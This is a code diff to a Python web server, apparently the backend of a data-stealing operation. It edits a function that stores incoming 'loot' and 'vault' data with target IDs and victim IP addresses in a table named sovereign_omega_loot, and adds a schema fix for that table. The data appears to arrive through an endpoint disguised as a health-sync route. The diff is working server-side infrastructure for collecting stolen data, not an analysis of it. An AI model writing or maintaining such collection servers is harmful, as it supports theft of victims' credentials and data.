@@ -101,15 +101,37 @@ def process_incoming_loot(raw_bytes: bytes, ip: str):
         conn = get_db_conn()
         cur = conn.cursor()
         cur.execute("""
-            INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class, metadata)
-            VALUES (%s, %s, %s, %s, %s, %s, %s)
-        """, (data.get('tid'), data.get('tag'), ip, secure_loot, json.dumps(data.get('vault', {})), target_class, json.dumps(data.get('hw'))))
+            INSERT INTO sovereign_omega_loot 
+            (target_id, gift_tag, ip_address, encrypted_loot, vault_data)
+            VALUES (%s, %s, %s, %s, %s)
+        """, (tid, tag, ip, raw_b64, json.dumps(vault)))
         conn.commit()
         cur.close()
         conn.close()
 
     except Exception as e:
         logger.error(f"💀 CRITICAL_FAILURE: {str(e)}")
+
+def fix_database_schema():
+    conn = get_db_conn()
+    cur = conn.cursor()
+    try:
+        # هذا السطر يضيف العمود إذا لم يكن موجوداً بصمت
+        cur.execute("""
+            ALTER TABLE sovereign_omega_loot 
+            ADD COLUMN IF NOT EXISTS vault_data JSONB;
+        """)
+        conn.commit()
+        print("✅ Database schema updated successfully!")
+    except Exception as e:
+        conn.rollback()
+        print(f"⚠️ Schema update skipped or failed: {e}")
+    finally:
+        cur.close()
+        conn.close()
+
+# استدعاء الدالة عند تشغيل السيرفر
+fix_database_schema()
 
 # --- 5. البوابات ---
 @app.post("/api/v1/sys/health/sync")
